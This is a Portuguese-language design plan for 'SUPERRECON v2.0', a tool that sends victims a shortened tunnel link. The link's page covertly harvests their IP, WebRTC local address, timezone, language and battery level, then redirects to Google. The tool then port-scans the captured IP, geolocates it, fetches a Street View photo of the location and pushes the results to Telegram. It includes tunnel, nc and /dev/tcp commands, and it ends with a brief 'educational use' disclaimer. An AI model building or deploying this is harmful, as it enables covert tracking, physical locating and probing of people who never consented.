# SUPERRECON v2.0 — Plano de Arquitetura

> **Engrenagem de Reconhecimento Geográfico e de Rede (OSINT)**
>
> Modos: Link (ativo) + Manual IP (passivo) | Túneis redundantes | Relatório HTML portátil

---

## 📁 Estrutura de Arquivos

```
D:\Prg\iptracker\
│
├── super_recon.sh              # Orquestrador principal (bash — Linux/WSL/Git Bash)
├── super_recon.ps1             # Wrapper PowerShell (Windows nativo)
├── run.bat                     # Launcher duplo clique
├── config.env                  # Config: Telegram token, chave Google Maps, etc.
│
├── index.php                   # Página de captura (frontend JS + handler PHP)
│
├── lib/                        # Módulos carregados pelo orquestrador
│   ├── core.sh                 # Validação de IP, formatação, utils
│   ├── geo.sh                  # Geolocalização (ip-api.com)
│   ├── ports.sh                # Scan de portas TCP
│   ├── weather.sh              # Clima (wttr.in)
│   ├── streetview.sh           # Street View + mapas (Google Maps API)
│   ├── report.sh               # Gerador de relatório HTML + CSS
│   ├── tunnels.sh              # Gerenciamento dos 3 túneis (CF, Ngrok, Loclx)
│   └── notify.sh               # Notificação Telegram / Discord
│
└── output/                     # Relatórios gerados (criado automaticamente)
    ├── recon_8.8.8.8/
    │   ├── report.html
    │   ├── street.jpg
    │   ├── geo.json
    │   ├── whois.txt
    │   └── portas.txt
    └── ...
```

**Total:** 13 arquivos | **Camadas:** Config + Launchers → Frontend → Módulos (lib/) → Orquestrador

---

## 🔁 Fluxo de Execução

### Modo Link (`./super_recon.sh -l` ou `run.bat`)

```
1. Lê config.env (Telegram token, etc.)
2. Sobe servidor PHP embutido na porta 8080
     → php -S 0.0.0.0:8080 -t . index.php
3. Dispara 3 túneis em PARALELO (subshells):
     ├─ cloudflared tunnel --url http://localhost:8080
     ├─ ngrok http 8080
     └─ loclx tunnel http --to 127.0.0.1:8080
4. Aguarda túneis ficarem prontos (poll a cada 2s, timeout 30s)
5. Encurta URLs via TinyURL + is.gd
6. Exibe links formatados na tela
7. Entra em modo "escuta" (tail -f no log)
8. Quando vítima acessa → index.php captura e salva captures/last_ip.txt
9. Dispara super_recon.sh -s $(cat captures/last_ip.txt) em background
10. Loop de notificação (Telegram) e exibição
```

### Modo Scan (`./super_recon.sh -s 8.8.8.8`)

```
1. Valida IP (regex)
2. Cria output/recon_<IP>/
3. Executa pipeline sequencial:
     ├─ [core.sh]     → valida e prepara
     ├─ [geo.sh]      → curl -s ip-api.com/json/<IP> → geo.json
     ├─ [ports.sh]    → scan TCP 21..8080 → portas.txt
     ├─ [weather.sh]  → curl wttr.in/<cidade> → clima
     ├─ [streetview.sh] → curl maps.googleapis.com → street.jpg + URL panorâmica
     └─ [report.sh]   → compila tudo → report.html + abre no navegador
4. [notify.sh] → envia foto + resumo pro Telegram
```

---

## 🧩 index.php — Página de Captura

**O que faz:**

1. Recebe requisição GET → loga IP + User-Agent em `captures/<timestamp>.txt`
2. Serve HTML com JavaScript que captura:
   - Resolução (`screen.width x screen.height`)
   - Idioma (`navigator.language`)
   - Fuso horário (`Intl.DateTimeFormat().resolvedOptions().timeZone`)
   - IP local via WebRTC (STUN: `stun.l.google.com:19302`)
   - Nível de bateria (`navigator.getBattery().level`)
3. Serializa tudo em JSON → codifica Base64 → envia via AJAX GET para `?d=<base64>`
4. Redireciona pro Google após 3s (delay inteligente)
5. Handler PHP salva em `captures/<IP>/<timestamp>.json` e grava em `captures/last_ip.txt`

---

## 🛠️ Módulos (lib/)

### `core.sh` — Utilitários
- `validar_ip()` — regex IPv4
- `formatar_data()` — timestamp ISO
- `criar_pasta_recon()` — mkdir + estrutura de diretórios

### `geo.sh` — Geolocalização
- `geo_lookup()` — curl `ip-api.com/json/{IP}` → salva `geo.json`
- Campos: lat, lon, city, regionName, country, org, isp, timezone, zip
- Fallback: `ipinfo.io/{IP}` se ip-api falhar

### `ports.sh` — Scan de Portas
- `scan_ports()` — loop sobre lista `21 22 25 80 443 3306 8080`
- Usa `/dev/tcp/{IP}/{porta}` no bash, ou `nc -zv -w2`
- Saída formatada: `✅ 80/tcp (HTTP) — Aberta` / `❌ 22/tcp (SSH) — Fechada`

### `weather.sh` — Clima
- `get_weather()` — curl `wttr.in/{cidade}?format=%t+%C+%w`
- Extrai temperatura, condição, velocidade do vento

### `streetview.sh` — Street View + Mapas
- `get_streetview()` — baixa imagem via Google Street View API
- `get_embed_html()` — gera iframe do Google Maps Embed
- `get_panorama_url()` — link direto pro Street View 360°
- Salva `street.jpg` na pasta do recon

### `tunnels.sh` — Gerenciamento de Túneis

| Tunnel | Comando | Como extrair URL |
|--------|---------|------------------|
| **Cloudflared** | `cloudflared tunnel --url http://localhost:8080` | Grep no stdout: `.trycloudflare.com` |
| **Ngrok** | `ngrok http 8080 --log=stdout` | API: `curl localhost:4040/api/tunnels` |
| **Loclx** | `loclx tunnel http --to 127.0.0.1:8080` | Grep no stdout: `.loclx.io` |

- `shorten_urls()` — curl TinyURL + is.gd para encurtar
- `wait_for_tunnels()` — loop com timeout, poll a cada 2s
- `cleanup_tunnels()` — kill processos filhos via `trap`

### `report.sh` — Gerador HTML
- Gera HTML com CSS dark mode embutido
- Seções: Cabeçalho (IP, localização, clima) → Mapa (iframe) → Street View (img + link) → Portas (tabela) → WHOIS (pre) → Rodapé
- Salva como `{pasta_recon}/report.html`
- Abre no navegador (cross-platform)

### `notify.sh` — Notificações
- `notify_telegram()` — envia street.jpg + legenda formatada via Bot API
- `notify_discord()` — envia webhook embed
- Lê token/chat_id/channel de `config.env`

---

## ⚙️ config.env

```bash
# SUPERRECON v2.0 — Configuração
TELEGRAM_BOT_TOKEN=""
TELEGRAM_CHAT_ID=""
GOOGLE_MAPS_KEY=""
CLOUDFLARED_PATH="cloudflared"
NGROK_PATH="ngrok"
LOCLX_PATH="loclx"
PHP_PORT=8080
REDIRECT_URL="https://www.google.com"
DEBUG=0
```

---

## 🪟 Wrappers Windows

### `super_recon.ps1`
- Detecta WSL, Git Bash ou PowerShell nativo
- WSL disponível → invoca `bash super_recon.sh $args`
- Git Bash → invoca `bash.exe super_recon.sh $args`
- Só PowerShell → versão reduzida (modo `-s` apenas)

### `run.bat`
```batch
@echo off
where wsl >nul 2>nul && (wsl ./super_recon.sh %*) && exit /b
where bash >nul 2>nul && (bash super_recon.sh %*) && exit /b
powershell -ExecutionPolicy Bypass -File super_recon.ps1 %*
```

---

## 📋 HTML Report Template

```
┌─────────────────────────────────────────────┐
│  🕵️ SUPERRECON v2.0 — Relatório de IP       │
│  IP: {ip} | Data: {data}                    │
├─────────────────────────────────────────────┤
│  🌍 LOCALIZAÇÃO                             │
│  {cidade} / {estado} — {país}               │
│  ISP: {isp} | Lat: {lat} Lon: {lon}         │
│  🌤️ {temperatura} — {condicao} — Vento: {vento}│
├─────────────────────────────────────────────┤
│  🗺️ MAPA INTERATIVO                         │
│  [Iframe Google Maps zoom 15]               │
├─────────────────────────────────────────────┤
│  🏙️ STREET VIEW                             │
│  [street.jpg 600x300]                       │
│  [🔗 Ver no Google Street View 360°]        │
├─────────────────────────────────────────────┤
│  🚪 SCAN DE PORTAS                          │
│  ✅ 80/tcp (HTTP)     — Aberta              │
│  ❌ 22/tcp (SSH)      — Fechada             │
├─────────────────────────────────────────────┤
│  📋 WHOIS                                    │
│  [primeiras 20 linhas]                      │
├─────────────────────────────────────────────┤
│  ⚙️ Gerado por SUPERRECON v2.0              │
│  {timestamp}                                │
└─────────────────────────────────────────────┘
```

---

## ✅ Checklist de Implementação

| # | Tarefa | Arquivo | Depende de |
|---|--------|---------|------------|
| 1 | Estrutura de pastas + config.env | — | — |
| 2 | `core.sh` — validação e utils | lib/core.sh | — |
| 3 | `index.php` — página de captura | index.php | — |
| 4 | `geo.sh` — geolocalização | lib/geo.sh | core.sh |
| 5 | `ports.sh` — scan de portas | lib/ports.sh | core.sh |
| 6 | `weather.sh` — clima | lib/weather.sh | geo.sh |
| 7 | `streetview.sh` — street view + mapas | lib/streetview.sh | geo.sh |
| 8 | `report.sh` — gerador HTML | lib/report.sh | Todos acima |
| 9 | `notify.sh` — Telegram/Discord | lib/notify.sh | report.sh |
| 10 | `tunnels.sh` — túneis + encurtar | lib/tunnels.sh | — |
| 11 | `super_recon.sh` — orquestrador principal | super_recon.sh | Todos lib/ |
| 12 | `super_recon.ps1` — wrapper PowerShell | super_recon.ps1 | — |
| 13 | `run.bat` — launcher duplo clique | run.bat | — |
| 14 | Teste completo dos 2 modos | — | Tudo |

---

## 🔑 Dependências Externas

| Serviço | Função | Custo |
|---------|--------|-------|
| **ip-api.com** | Geolocalização (lat/lon/ISP) | Gratuito (45 req/min) |
| **wttr.in** | Clima e temperatura | Gratuito |
| **Google Maps Embed** | Mapa interativo + Street View | Chave gratuita (crédito $300 GCP) |
| **Cloudflared** | Tunnel HTTPS | Gratuito |
| **Ngrok** | Tunnel HTTPS | Gratuito (limites baixos) |
| **Loclx** | Tunnel HTTPS | Gratuito |
| **Telegram Bot API** | Notificações com foto | Gratuito |

---

> **Disclaimer:** Ferramenta exclusivamente para fins educacionais, pentest autorizado e ambientes próprios. Coletar IPs, fotografar ruas ou escanear portas sem consentimento é crime (LGPD). A responsabilidade é toda sua.
